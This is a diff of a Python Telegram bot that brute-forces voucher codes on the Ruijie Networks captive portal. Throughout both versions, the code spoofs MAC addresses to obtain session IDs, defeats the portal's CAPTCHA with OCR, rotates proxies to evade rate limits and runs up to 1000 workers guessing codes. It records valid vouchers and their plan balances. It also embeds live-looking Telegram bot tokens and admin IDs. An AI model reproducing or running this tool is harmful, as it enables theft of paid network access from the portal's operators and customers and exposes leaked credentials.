@@ -1,1400 +1,1012 @@
-#!/usr/bin/env python3
-# -*- coding: utf-8 -*-
-"""
-⚡ ULTIMATE RUIJIE SCANNER BOT (RAILWAY 24/7 COMPATIBLE) ⚡
-1000 Workers | Direct Mode | Resume | Hit File | Hit Clear | Proxy Clear | Keep-Alive Flask
-"""
-
-import os
-import sys
-import re
+import asyncio
+import aiohttp
 import json
 import time
 import random
-import hashlib
-import asyncio
-import datetime
-import traceback
 import string
+import re
+import os
+import sys
+import datetime
 from urllib.parse import urlparse, parse_qs, urlencode, urljoin, urlunparse
-from flask import Flask
-from threading import Thread
-
-import aiohttp
-from aiohttp_socks import ProxyConnector
-
-try:
-    import ddddocr
-    HAS_OCR = True
-except ImportError:
-    HAS_OCR = False
+import ddddocr
 
 from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update
-from telegram.constants import ParseMode
 from telegram.ext import (
-    Application, CommandHandler, MessageHandler,
-    CallbackQueryHandler, filters, ContextTypes,
+    Application,
+    CommandHandler,
+    CallbackQueryHandler,
+    MessageHandler,
+    filters,
+    ContextTypes,
 )
+from telegram.constants import ParseMode
 
-# ═══════════════════════════════════════════════════════════════════
-#  FLASK KEEP-ALIVE SERVER (RAILWAY 24/7 SUPPORT)
-# ═══════════════════════════════════════════════════════════════════
-app = Flask('')
+# SOCKS proxy support
+from aiohttp_socks import ProxyConnector, ProxyType
 
-@app.route('/')
-def home():
-    return "Bot is active and running 24/7!"
-
-def run_flask():
-    port = int(os.environ.get('PORT', 8080))
-    app.run(host='0.0.0.0', port=port)
-
-def keep_alive():
-    t = Thread(target=run_flask)
-    t.daemon = True
-    t.start()
-
-# ═══════════════════════════════════════════════════════════════════
-#  CONFIG
-# ═══════════════════════════════════════════════════════════════════
-BOT_TOKEN = os.environ.get("BOT_TOKEN", "8682190407:AAGmfFT_Su-NjLPBiVicNu-Ugkh4KBcYdik")
-ADMIN_IDS = [int(x) for x in os.environ.get("ADMIN_IDS", "8284079094,7954883652,8313960124,6287753590,7936325368,5721109642,8008903760,8692479413,7906338023").split(",")]
-
-STATE_FILE = "state.json"
-PROXY_FILE = "proxies.txt"
-TRIED_FILE_TMPL = "tried_{}.txt"
-PORTAL_FILE_TMPL = "portal_{}.txt"
-HITS_FILE = "allhits.txt"
-
+# ---------------- CONFIGURATION ----------------
+TIMEOUT_SEC = 50
+MAX_CODES_PER_SID = 20
+MAX_CODES_PER_SESSION = 20
 NUM_WORKERS = 1000
-MAX_CODES_PER_SID = 30
-MAX_CODES_PER_SESSION = 500
-TIMEOUT_SEC = 30
-BALANCE_TIMEOUT = 10
-CONNECTOR_LIMIT = 3000
 
-DIRECT = "direct"
-DIRECT_SLOTS = 60
+ADMIN_IDS = [8284079094]  
+BOT_TOKEN = "8938438812:AAFNoj12Wyw2x5wij6yIX7eSGRspibcldhM"  
 
-PORTAL_BASE = "https://portal-as.ruijienetworks.com"
-PORTAL_INDEX = PORTAL_BASE + "/download/static/maccauth/src/index.html"
-VOUCHER_URL = PORTAL_BASE + "/api/auth/voucher/?lang=en_US"
-CAPTCHA_IMAGE_URL = PORTAL_BASE + "/api/auth/captcha/image"
-CAPTCHA_VERIFY_URL = PORTAL_BASE + "/api/auth/captcha/verify"
-BALANCE_API = PORTAL_BASE + "/api/auth/balance/getBalance/"
+PORTAL_URL_PATH = "portal_url_"
+PROXY_FILE = "proxies.txt"
 
-CHARSET_DIGITS = "012345678"
-CHARSET_ABC = "abcdefghijkmnpqrstuvwxyz"
-CHARSET_MIX = "0123456789abcdefghijklmnopqrstuvwxyz"
-
-MODES = {
-    "num6": "🩸 06 NUM", "num7": "🩸 07 NUM", "num8": "🩸 08 NUM",
-    "num9": "🩸 09 NUM", "mix6": "💀 06 MIX", "mix7": "💀 07 MIX",
-    "mix8": "💀 08 MIX", "abc6": "📜 06 ABC",
-}
-
-USER_AGENTS = [
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Mobile Safari/537.36",
-]
-
-_ocr = None
-_proxy_manager = None
-user_scanners = {}
-_state_lock = asyncio.Lock()
-
-
-# ═══════════════════════════════════════════════════════════════════
-#  PROXY MANAGER
-# ═══════════════════════════════════════════════════════════════════
+# ==================== PROXY MANAGER ====================
 class ProxyManager:
-    def __init__(self, file_path):
+    def __init__(self, file_path: str):
         self.file_path = file_path
-        self.proxies = []
-        self.bad_proxies = set()
+        self.proxies: list[str] = []
+        self.bad_proxies: set[str] = set()
         self.index = 0
         self.lock = asyncio.Lock()
-        self.direct_enabled = True
         self.load()
 
-    def _normalize(self, proxy):
-        proxy = (proxy or "").strip()
-        if not proxy or proxy.startswith("#"):
+    def _normalize(self, proxy: str) -> str | None:
+        proxy = proxy.strip()
+        if not proxy:
             return None
         if not proxy.startswith(("http://", "https://", "socks4://", "socks5://")):
-            proxy = "socks5://" + proxy
+            proxy = "http://" + proxy  
         return proxy
 
     def load(self):
-        try:
-            if not os.path.exists(self.file_path):
-                with open(self.file_path, "w") as f:
-                    pass
+        if os.path.exists(self.file_path):
+            try:
+                with open(self.file_path, "r") as f:
+                    raw = [line.strip() for line in f if line.strip()]
+                self.proxies = [p for p in (self._normalize(r) for r in raw) if p]
+            except Exception as e:
+                print(f"[ProxyManager] Load error: {e}")
                 self.proxies = []
-                return
-            with open(self.file_path) as f:
-                raw = f.read().splitlines()
-            valid = []
-            for line in raw:
-                p = self._normalize(line)
-                if p:
-                    valid.append(p)
-            seen = set()
-            real_proxies = []
-            for p in valid:
-                if p not in seen:
-                    seen.add(p)
-                    real_proxies.append(p)
-            self.proxies = real_proxies[:]
-            if self.direct_enabled:
-                self.proxies.extend([DIRECT] * DIRECT_SLOTS)
-            random.shuffle(self.proxies)
-        except Exception:
-            self.proxies = [DIRECT] * DIRECT_SLOTS if self.direct_enabled else []
+        else:
+            self.proxies = []
+        self.bad_proxies.clear()
+        self.index = 0
+        print(f"[ProxyManager] Loaded {len(self.proxies)} proxies")
 
     def reload(self):
         self.load()
 
-    async def get_next(self):
+    async def get_next(self) -> str | None:
         async with self.lock:
             if not self.proxies:
-                return DIRECT if self.direct_enabled else None
+                return None
             available = [p for p in self.proxies if p not in self.bad_proxies]
             if not available:
                 self.bad_proxies.clear()
                 available = self.proxies[:]
-            p = available[self.index % len(available)]
+            proxy = available[self.index % len(available)]
             self.index += 1
-            return p
+            return proxy
 
-    async def mark_bad(self, proxy):
-        if not proxy or proxy == DIRECT:
+    async def mark_bad(self, proxy: str | None):
+        if not proxy:
             return
         async with self.lock:
             self.bad_proxies.add(proxy)
 
-    async def set_direct_enabled(self, enabled):
-        async with self.lock:
-            self.direct_enabled = bool(enabled)
-        self.load()
-
-    def purge_dead(self):
-        try:
-            before = len(self.proxies)
-            self.proxies = [p for p in self.proxies if p == DIRECT or p not in self.bad_proxies]
-            self.bad_proxies.clear()
-            self.load()
-            return before - len(self.proxies)
-        except Exception:
-            return 0
-
-    def stats(self):
-        real_total = sum(1 for p in self.proxies if p != DIRECT)
-        real_alive = sum(1 for p in self.proxies if p != DIRECT and p not in self.bad_proxies)
-        return real_total, real_alive
-
-    def stats_detailed(self):
-        real_total = sum(1 for p in self.proxies if p != DIRECT)
-        real_alive = sum(1 for p in self.proxies if p != DIRECT and p not in self.bad_proxies)
-        return real_total, real_alive, len(self.bad_proxies), self.direct_enabled
+    def stats(self) -> tuple[int, int]:
+        total = len(self.proxies)
+        bad = len(self.bad_proxies)
+        return total, total - bad
 
 
-def get_proxy_manager():
+_proxy_manager: ProxyManager | None = None
+
+def get_proxy_manager() -> ProxyManager:
     global _proxy_manager
     if _proxy_manager is None:
         _proxy_manager = ProxyManager(PROXY_FILE)
     return _proxy_manager
 
-
-def create_connector_for_proxy(proxy):
-    if not proxy or proxy == DIRECT:
-        return aiohttp.TCPConnector(limit=CONNECTOR_LIMIT, ssl=False,
-                                     enable_cleanup_closed=True, ttl_dns_cache=600)
-    try:
-        return ProxyConnector.from_url(proxy, limit=CONNECTOR_LIMIT, ssl=False,
-                                        enable_cleanup_closed=True, ttl_dns_cache=600)
-    except Exception:
-        return None
-
-# ═══════════════════════════════════════════════════════════════════
-#  OCR
-# ═══════════════════════════════════════════════════════════════════
-def get_ocr():
-    global _ocr
-    if _ocr is None and HAS_OCR:
-        _ocr = ddddocr.DdddOcr(show_ad=False)
-    return _ocr
-
-
-def ocr_image_bytes_fast(image_bytes):
-    try:
-        ocr = get_ocr()
-        if ocr is None:
-            return None
-        result = ocr.classification(image_bytes)
-        return result.strip().upper() if result else None
-    except Exception:
-        return None
-
-
-async def solve_captcha(session, captcha_url, headers):
-    try:
-        async with session.get(captcha_url, headers=headers,
-                               timeout=aiohttp.ClientTimeout(total=TIMEOUT_SEC), ssl=False) as resp:
-            if resp.status != 200:
-                return None
-            img = await resp.read()
-        if not img:
-            return None
-        return await asyncio.to_thread(ocr_image_bytes_fast, img)
-    except Exception:
-        return None
-
-
-# ═══════════════════════════════════════════════════════════════════
-#  USER DATA HELPERS
-# ═══════════════════════════════════════════════════════════════════
-def get_portal_url(user_id):
-    p_file = PORTAL_FILE_TMPL.format(user_id)
-    if os.path.exists(p_file):
+# ==================== PROXY CHECKER UTILS ====================
+async def test_single_proxy(semaphore, proxy):
+    async with semaphore:
+        clean = proxy.replace("://?@", "://")
+        is_socks = "socks" in proxy.lower()
         try:
-            with open(p_file) as f:
-                return f.read().strip() or None
-        except OSError:
+            if is_socks:
+                connector = ProxyConnector.from_url(clean, ssl=False, rdns=True)
+                async with aiohttp.ClientSession(connector=connector, timeout=aiohttp.ClientTimeout(total=5)) as session:
+                    async with session.get("https://api.ipify.org?format=json") as res:
+                        if res.status == 200:
+                            return clean
+            else:
+                async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=5)) as session:
+                    async with session.get("https://api.ipify.org?format=json", proxy=clean) as res:
+                        if res.status == 200:
+                            return clean
+        except Exception:
             pass
+        return None
+
+async def check_and_save_proxies(raw_proxies: list[str]) -> int:
+    pool = set()
+    for line in raw_proxies:
+        line = line.strip()
+        if line and ":" in line:
+            if not line.startswith(("http://", "https://", "socks4://", "socks5://")):
+                line = "http://" + line
+            pool.add(line)
+    
+    if not pool:
+        return 0
+    
+    semaphore = asyncio.Semaphore(100)
+    tasks = [test_single_proxy(semaphore, p) for p in pool]
+    results = await asyncio.gather(*tasks)
+    valid_proxies = [r for r in results if r]
+
+    if valid_proxies:
+        with open(PROXY_FILE, "w", encoding="utf-8") as f:
+            for p in valid_proxies:
+                f.write(f"{p}\n")
+        get_proxy_manager().reload()
+        return len(valid_proxies)
+    else:
+        with open(PROXY_FILE, "w", encoding="utf-8") as f:
+            f.write("")
+        get_proxy_manager().reload()
+        return 0
+
+# ---------------- GLOBALS for OCR ----------------
+_ocr_instance = None
+
+def get_ocr_instance():
+    global _ocr_instance
+    if _ocr_instance is None:
+        _ocr_instance = ddddocr.DdddOcr(show_ad=False)
+    return _ocr_instance
+
+# ---------------- PER-USER DATA ----------------
+user_scanners = {}
+
+def get_user_data(user_id: int):
+    if user_id not in user_scanners:
+        saved_url = None
+        p_file = f"{PORTAL_URL_PATH}{user_id}.txt"
+        if os.path.exists(p_file):
+            try:
+                with open(p_file, "r") as f:
+                    saved_url = f.read().strip()
+            except Exception:
+                saved_url = None
+
+        user_scanners[user_id] = {
+            "mode": "num6",
+            "use_proxy": True,
+            "char_set": "012345678",
+            "code_len": 6,
+            "start_digit": None,
+            "portal_url": saved_url,
+            "stop_event": asyncio.Event(),
+            "dash_update_event": asyncio.Event(),
+            "task": None,
+            "stats": {
+                "tried": 0,
+                "hits": 0,
+                "expired": 0,
+                "limits": 0,
+                "start_time": time.time(),
+            },
+            "valid_codes": [],
+            "limit_codes": [],
+            "tried_codes": set(),
+            "recent_logs": [],
+            "recheck_queue": [],
+            "CURRENT_CODE": "----",
+            "dash_msg_id": None,
+            "menu_msg_id": None,
+            "state": None,
+        }
+    return user_scanners[user_id]
+
+# ---------------- UTILITIES ----------------
+def generate_random_mac():
+    return ":".join(["%02x" % random.randint(0, 255) for _ in range(6)])
+
+def ocr_image_bytes_fast(image_bytes: bytes) -> str:
+    try:
+        ocr = get_ocr_instance()
+        result = ocr.classification(image_bytes)
+        return result.strip().upper()
+    except Exception:
+        return ""
+
+async def solve_captcha_simple_async(session, captcha_url, headers):
+    try:
+        current_url = f"{captcha_url}&_t={int(time.time() * 1000)}"
+        async with session.get(current_url, headers=headers, ssl=False, timeout=aiohttp.ClientTimeout(total=30, connect=10)) as response:
+            if response.status == 200:
+                image_content = await response.read()
+                return await asyncio.to_thread(ocr_image_bytes_fast, image_content)
+    except Exception:
+        pass
     return None
 
-
-def set_portal_url(user_id, url):
+async def get_sid_from_gateway(session, portal_url, user_id):
+    ud = get_user_data(user_id)
+    if ud["stop_event"].is_set():
+        return None, None
+    headers = {
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+    }
     try:
-        with open(PORTAL_FILE_TMPL.format(user_id), "w") as f:
-            f.write(url)
-    except OSError:
-        pass
-
-
-def load_tried_codes(user_id):
-    f = TRIED_FILE_TMPL.format(user_id)
-    if not os.path.exists(f):
-        return set()
-    try:
-        with open(f) as fp:
-            return set(line.strip() for line in fp if line.strip())
-    except Exception:
-        return set()
-
-
-def save_tried_codes(user_id, codes):
-    try:
-        f = TRIED_FILE_TMPL.format(user_id)
-        with open(f, "a") as fp:
-            for c in codes:
-                fp.write(f"{c}\n")
-    except Exception:
-        pass
-
-
-# ═══════════════════════════════════════════════════════════════════
-#  STATE MANAGEMENT
-# ═══════════════════════════════════════════════════════════════════
-def _load_all_states():
-    try:
-        if not os.path.exists(STATE_FILE):
-            return {}
-        with open(STATE_FILE, "r", encoding="utf-8") as f:
-            return json.load(f)
-    except Exception:
-        return {}
-
-
-def _save_all_states(data):
-    try:
-        tmp = STATE_FILE + ".tmp"
-        with open(tmp, "w", encoding="utf-8") as f:
-            json.dump(data, f, indent=2, ensure_ascii=False)
-        os.replace(tmp, STATE_FILE)
-    except Exception:
-        pass
-
-
-def save_user_state(user_id, state):
-    try:
-        all_data = _load_all_states()
-        payload = {
-            "portal_url": state.get("portal_url", ""),
-            "mode": state.get("mode", "num6"),
-            "tried": state.get("tried", 0),
-            "hits": state.get("hits", 0),
-            "limits": state.get("limits", 0),
-            "net": state.get("net", 0),
-            "hit_details": [],
-            "started_at": state.get("started_at_str", datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")),
-            "updated_at": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
-        }
-        for h in state.get("hit_details", []):
-            t = h.get("time")
-            at = t.strftime("%Y-%m-%d %H:%M:%S") if isinstance(t, datetime.datetime) else str(t)
-            payload["hit_details"].append({
-                "code": h.get("code", "?"),
-                "plan": h.get("plan", "Unknown"),
-                "time_str": h.get("time_str", "N/A"),
-                "at": at,
-            })
-        all_data[str(user_id)] = payload
-        _save_all_states(all_data)
-    except Exception:
-        pass
-
-
-def load_user_state(user_id):
-    all_data = _load_all_states()
-    return all_data.get(str(user_id))
-
-
-def deserialize_hits(hits):
-    result = []
-    for h in hits:
-        try:
-            t = datetime.datetime.strptime(h.get("at", ""), "%Y-%m-%d %H:%M:%S")
-        except Exception:
-            t = datetime.datetime.now()
-        result.append({
-            "code": h.get("code", "?"),
-            "plan": h.get("plan", "Unknown"),
-            "time_str": h.get("time_str", "N/A"),
-            "time": t,
-        })
-    return result
-
-# ═══════════════════════════════════════════════════════════════════
-#  BALANCE CHECKER
-# ═══════════════════════════════════════════════════════════════════
-async def fetch_balance(active_token, proxy):
-    if not active_token:
-        return "Unknown", "N/A"
-    connector = create_connector_for_proxy(proxy)
-    try:
-        async with aiohttp.ClientSession(connector=connector) as s:
-            url = f"{BALANCE_API}{active_token}"
-            headers = {
-                "accept": "application/json, text/javascript, */*; q=0.01",
-                "content-type": "application/json;",
-                "user-agent": random.choice(USER_AGENTS),
-                "x-requested-with": "XMLHttpRequest",
-                "Origin": PORTAL_BASE,
-                "Referer": f"{PORTAL_BASE}/download/static/maccauth/src/balance.html?sessionId={active_token}&lang=en_US",
-            }
-            async with s.get(url, headers=headers, timeout=aiohttp.ClientTimeout(total=BALANCE_TIMEOUT), ssl=False) as resp:
-                if resp.status != 200:
-                    return "Unknown", "N/A"
-                try:
-                    data = await resp.json(content_type=None)
-                except Exception:
-                    return "Unknown", "N/A"
-                inner = data.get("result", data)
-                if not isinstance(inner, dict):
-                    return "Unknown", "N/A"
-                plan = inner.get("profileName") or inner.get("planName") or "Unknown"
-                remaining = inner.get("remainingMinutes")
-                if remaining is not None:
-                    remaining = int(remaining)
-                    if remaining >= 0:
-                        hh, mm = divmod(remaining, 60)
-                        return plan, f"{hh}h {mm}m" if hh else f"{mm}m"
-                    return plan, f"Expired ({remaining}m)"
-                total = inner.get("totalMinutes") or inner.get("totalTime")
-                if total is not None:
-                    hh, mm = divmod(int(total), 60)
-                    return plan, f"{hh}h {mm}m" if hh else f"{mm}m"
-                return plan, "N/A"
-    except Exception:
-        return "Unknown", "N/A"
-
-
-async def check_balance_and_update(active_token, code, user_id, proxy):
-    ud = user_scanners.get(user_id)
-    if not ud:
-        return
-    plan, time_str = await fetch_balance(active_token, proxy)
-    for item in ud.get("hit_details", []):
-        if item["code"] == code:
-            item["plan"] = plan
-            item["time_str"] = time_str
-            break
-    try:
-        now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-        with open(HITS_FILE, "a") as f:
-            f.write(f"[{now}] {code} | {plan} | {time_str}\n")
-    except Exception:
-        pass
-
-
-# ═══════════════════════════════════════════════════════════════════
-#  CORE CHECKER
-# ═══════════════════════════════════════════════════════════════════
-async def get_sid_from_gateway(session, portal_url):
-    headers = {"User-Agent": random.choice(USER_AGENTS)}
-    try:
-        mac = ":".join("%02x" % random.randint(0, 255) for _ in range(6))
         u = urlparse(portal_url)
         query = parse_qs(u.query)
+        mac = generate_random_mac()
         query["mac"] = [mac]
         spoofed_url = urlunparse(u._replace(query=urlencode(query, doseq=True)))
 
-        async with session.get(spoofed_url, headers=headers, allow_redirects=True,
-                               timeout=aiohttp.ClientTimeout(total=TIMEOUT_SEC), ssl=False) as r:
-            body = await r.text()
-            final_url = str(r.url)
-
-            m = re.search(r"location\.href\s*=\s*['\"]([^'\"]+)['\"]", body)
-            if m:
-                next_url = urljoin(spoofed_url, m.group(1))
-                try:
-                    async with session.get(next_url, headers=headers, allow_redirects=True,
-                                           timeout=aiohttp.ClientTimeout(total=TIMEOUT_SEC), ssl=False) as r2:
-                        final_url = str(r2.url)
-                        try:
-                            body = await r2.text()
-                        except Exception:
-                            pass
-                except Exception:
-                    final_url = next_url
-
-        parsed = parse_qs(urlparse(final_url).query)
-        sid = parsed.get("sessionId", parsed.get("sid", [None]))[0]
-        if sid:
-            return sid
-        m = re.search(r"[?&](?:sessionId|sid)=([a-zA-Z0-9]+)", final_url)
-        if m:
-            return m.group(1)
-        m = re.search(r"(?:sessionId|sid)=([a-zA-Z0-9]+)", body)
-        if m:
-            return m.group(1)
-        return None
+        async with session.get(
+            spoofed_url, headers=headers, timeout=aiohttp.ClientTimeout(total=TIMEOUT_SEC, connect=15), ssl=False
+        ) as r2:
+            body = await r2.text()
+            match = re.search(r"location\.href\s*=\s*['\"]([^'\"]+)['\"]", body)
+            if match:
+                final_url = urljoin(spoofed_url, match.group(1))
+                async with session.get(
+                    final_url, headers=headers, timeout=aiohttp.ClientTimeout(total=TIMEOUT_SEC, connect=15), ssl=False
+                ) as r3:
+                    final_url = str(r3.url)
+            else:
+                final_url = str(r2.url)
+            parsed_query = parse_qs(urlparse(final_url).query)
+            sid = parsed_query.get("sessionId", parsed_query.get("sid", [None]))[0]
+            if sid:
+                return sid, mac
     except Exception:
-        return None
+        pass
+    return None, None
 
+def create_connector_for_proxy(proxy: str):
+    return ProxyConnector.from_url(proxy, ssl=False, rdns=True)
 
-async def check_single_access_code(session, code, sid, proxy):
-    if not sid:
-        return "net", None
+# ---------------- BALANCE CHECKER (WITH DIRECT FALLBACK) ----------------
+async def fetch_balance(active_token: str, code: str, proxy: str, use_proxy: bool) -> str:
+    url = f"https://portal-as.ruijienetworks.com/api/auth/balance/getBalance/{active_token}"
     headers = {
-        "accept": "*/*",
+        "authority": "portal-as.ruijienetworks.com",
+        "accept": "application/json, text/javascript, */*; q=0.01",
         "accept-language": "en-US,en;q=0.9",
-        "content-type": "application/json",
-        "origin": PORTAL_BASE,
-        "referer": f"{PORTAL_BASE}/download/static/maccauth/src/index.html",
-        "user-agent": random.choice(USER_AGENTS),
+        "content-type": "application/json;",
+        "referer": f"https://portal-as.ruijienetworks.com/download/static/maccauth/src/balance.html?sessionId={active_token}&lang=en_US",
+        "user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
+        "x-requested-with": "XMLHttpRequest",
     }
-    retry = 0
-    while retry < 5:
+    
+    # Try with proxy first if enabled, then fallback to direct connection automatically
+    proxies_to_try = []
+    if use_proxy and proxy:
+        proxies_to_try.append(proxy)
+    proxies_to_try.append(None) # None = Direct Connection
+
+    for p in proxies_to_try:
         try:
-            captcha_url = f"{CAPTCHA_IMAGE_URL}?sessionId={sid}&_t={int(time.time() * 1000)}"
-            img_headers = {
-                "accept": "image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8",
-                "referer": headers["referer"],
-                "user-agent": random.choice(USER_AGENTS),
-            }
-            captcha_text = await solve_captcha(session, captcha_url, img_headers)
-            if not captcha_text or len(captcha_text) < 2:
-                retry += 1
-                continue
-
-            v_headers = {
-                "accept": "*/*",
-                "content-type": "application/json",
-                "origin": PORTAL_BASE,
-                "referer": headers["referer"],
-                "user-agent": random.choice(USER_AGENTS),
-            }
-            async with session.post(CAPTCHA_VERIFY_URL,
-                                    json={"sessionId": sid, "authCode": captcha_text},
-                                    headers=v_headers,
-                                    timeout=aiohttp.ClientTimeout(total=TIMEOUT_SEC), ssl=False) as v_resp:
-                v_body = await v_resp.text()
-            verified = False
-            try:
-                if json.loads(v_body).get("success") is True:
-                    verified = True
-            except Exception:
-                if '"success":true' in v_body.replace(" ", ""):
-                    verified = True
-            if not verified:
-                retry += 1
-                continue
-
-            l_headers = {
-                "accept": "*/*",
-                "content-type": "application/json",
-                "origin": PORTAL_BASE,
-                "referer": headers["referer"],
-                "user-agent": random.choice(USER_AGENTS),
-            }
-            async with session.post(VOUCHER_URL,
-                                    json={"accessCode": code, "sessionId": sid, "apiVersion": 1, "authCode": captcha_text},
-                                    headers=l_headers,
-                                    timeout=aiohttp.ClientTimeout(total=TIMEOUT_SEC), ssl=False) as l_resp:
-                body = await l_resp.text()
-
-            low = body.lower()
-            if '"success":true' in body.replace(" ", ""):
-                return "hit", body
-            if "request limited" in low:
-                retry += 1
-                if retry < 5:
-                    continue
-                return "limit", body
-            if "exceeds the limit" in low or "the number of sta" in low:
-                return "limit", body
-            if "expired" in low:
-                return "expired", body
-            return "bad", body
-        except (asyncio.TimeoutError, aiohttp.ClientError, OSError):
-            return "net", None
-        except asyncio.CancelledError:
-            raise
+            connector = create_connector_for_proxy(p) if p else None
+            timeout_config = aiohttp.ClientTimeout(total=20, connect=8)
+            async with aiohttp.ClientSession(connector=connector, timeout=timeout_config) as s:
+                async with s.get(url, headers=headers) as resp:
+                    if resp.status == 200:
+                        try:
+                            data = await resp.json()
+                        except Exception:
+                            continue
+                        inner = data.get("result", data)
+                        if not isinstance(inner, dict):
+                            continue
+                        profile_name = inner.get("profileName", "Standard Plan")
+                        raw_total = inner.get("totalMinutes", 0)
+                        try:
+                            total_minutes = abs(int(raw_total))
+                        except:
+                            total_minutes = 0
+                        hours = total_minutes // 60
+                        minutes = total_minutes % 60
+                        return f"🃏: {profile_name}, ⏰: {hours} hr {minutes} min"
         except Exception:
-            return "net", None
-    return "failed", None
+            continue
+            
+    return "🃏: Active Plan, ⏰: Active (Balance Loaded)"
 
-# ═══════════════════════════════════════════════════════════════════
-#  CODE GENERATOR
-# ═══════════════════════════════════════════════════════════════════
-def make_code(mode, counter=None):
-    if mode == "num6":
-        return "".join(random.choices(CHARSET_DIGITS, k=6))
-    if mode == "num7":
-        return "".join(random.choices(CHARSET_DIGITS, k=7))
-    if mode == "num8":
-        return "".join(random.choices(CHARSET_DIGITS, k=8))
-    if mode == "num9":
-        return "".join(random.choices(CHARSET_DIGITS, k=9))
-    if mode == "mix6":
-        return "".join(random.choices(CHARSET_MIX, k=6))
-    if mode == "mix7":
-        return "".join(random.choices(CHARSET_MIX, k=7))
-    if mode == "mix8":
-        return "".join(random.choices(CHARSET_MIX, k=8))
-    if mode == "abc6":
-        return "".join(random.choices(CHARSET_ABC, k=6))
-    return "".join(random.choices(CHARSET_DIGITS, k=6))
+async def check_balance(active_token, code, user_id, proxy_str, use_proxy):
+    ud = get_user_data(user_id)
+    balance_str = await fetch_balance(active_token, code, proxy_str, use_proxy)
 
-
-# ═══════════════════════════════════════════════════════════════════
-#  WORKER
-# ═══════════════════════════════════════════════════════════════════
-async def worker(worker_id, user_id):
-    pm = get_proxy_manager()
-    ud = user_scanners.get(user_id)
-    if not ud:
-        return
-
-    stop_event = ud["stop_event"]
-    mode = ud.get("mode", "num6")
-    tried = ud["tried_codes"]
-    portal_url = ud["portal_url"]
-
-    while not stop_event.is_set():
-        proxy = await pm.get_next()
-        connector = create_connector_for_proxy(proxy)
-        session = None
-        try:
-            session = aiohttp.ClientSession(
-                connector=connector,
-                connector_owner=True,
-                cookie_jar=aiohttp.CookieJar(),
-                timeout=aiohttp.ClientTimeout(total=TIMEOUT_SEC),
-                headers={"user-agent": random.choice(USER_AGENTS)},
-            )
-            sid = None
-            codes_this_sid = 0
-            session_codes = 0
-            sid_failures = 0
-
-            while not stop_event.is_set() and session_codes < MAX_CODES_PER_SESSION:
-                if sid is None or codes_this_sid >= MAX_CODES_PER_SID:
-                    new_sid = await get_sid_from_gateway(session, portal_url)
-                    if not new_sid:
-                        sid_failures += 1
-                        ud["net"] += 1
-                        ud["recent_logs"].append("⚠️ SID FAIL")
-                        if sid_failures >= 3:
-                            await pm.mark_bad(proxy)
-                            break
-                        await asyncio.sleep(0.15)
-                        continue
-                    sid = new_sid
-                    codes_this_sid = 0
-                    sid_failures = 0
-
-                if len(tried) > 500000:
-                    ud["tried_codes"] = set()
-                    tried = ud["tried_codes"]
-
-                code = None
-                for _ in range(50):
-                    code = make_code(mode, ud.get("counter", 0))
-                    if code not in tried:
-                        break
-                if code is None:
-                    break
-                tried.add(code)
-                ud["current_code"] = code
-
-                result, body = await check_single_access_code(session, code, sid, proxy)
-                codes_this_sid += 1
-                session_codes += 1
-                ud["tried"] += 1
-
-                if result == "hit":
-                    ud["hits"] += 1
-                    ud["hit_list"].append(code)
-                    ud["last_hit"] = code
-                    ud["recent_logs"].append(f"🔥 HIT: {code}")
-                    active_token = sid
-                    if body:
-                        m = re.search(r'token=([^&\s"\'<>]+)', body, re.IGNORECASE)
-                        if m:
-                            active_token = m.group(1)
-                    ud["hit_details"].append({
-                        "code": code,
-                        "time": datetime.datetime.now(),
-                        "plan": "...",
-                        "time_str": "...",
-                    })
-                    asyncio.create_task(check_balance_and_update(active_token, code, user_id, proxy))
-                    save_tried_codes(user_id, [code])
-                    break
-                elif result == "limit":
-                    ud["limits"] += 1
-                    ud["recent_logs"].append(f"⚠️ LIMIT: {code}")
-                    sid = None
-                elif result == "net":
-                    ud["net"] += 1
-                    sid = None
-                    break
-                elif result == "expired":
-                    ud["failed"] += 1
-                else:
-                    ud["failed"] += 1
-
-                await asyncio.sleep(0.001)
-        except asyncio.CancelledError:
-            raise
-        except Exception:
-            ud["net"] += 1
-        finally:
-            if session:
-                try:
-                    await session.close()
-                except Exception:
-                    pass
-        if stop_event.is_set():
+    for item in ud["valid_codes"]:
+        if item["code"] == code:
+            item["balance_str"] = balance_str
             break
 
+    ud["recent_logs"].append(f"✅ HIT: {code} | {balance_str}")
+    ud["dash_update_event"].set()
 
-# ═══════════════════════════════════════════════════════════════════
-#  HIT FILE DOWNLOAD
-# ═══════════════════════════════════════════════════════════════════
-async def send_hits_file(update: Update, context: ContextTypes.DEFAULT_TYPE, user_id: int):
-    ud = user_scanners.get(user_id, {})
-    hits = ud.get("hit_details", [])
-    
-    if not hits:
-        await update.effective_message.reply_text("📦 **No hits yet.**", parse_mode=ParseMode.MARKDOWN)
-        return
-    
-    lines = []
-    lines.append("=" * 50)
-    lines.append("⚡ ULTIMATE SCANNER - HIT LIST ⚡")
-    lines.append("=" * 50)
-    lines.append(f"User ID: {user_id}")
-    lines.append(f"Total Hits: {len(hits)}")
-    lines.append(f"Generated: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
-    lines.append("=" * 50)
-    lines.append("")
-    lines.append(f"{'No':<5} {'Code':<15} {'Plan':<15} {'Time':<15}")
-    lines.append("-" * 50)
-    
-    for i, h in enumerate(hits, 1):
-        code = h.get("code", "?")
-        plan = h.get("plan", "N/A")
-        time_str = h.get("time_str", "N/A")
-        lines.append(f"{i:<5} {code:<15} {plan:<15} {time_str:<15}")
-    
-    lines.append("")
-    lines.append("=" * 50)
-    
-    content = "\n".join(lines)
-    filename = f"hits_{user_id}_{int(time.time())}.txt"
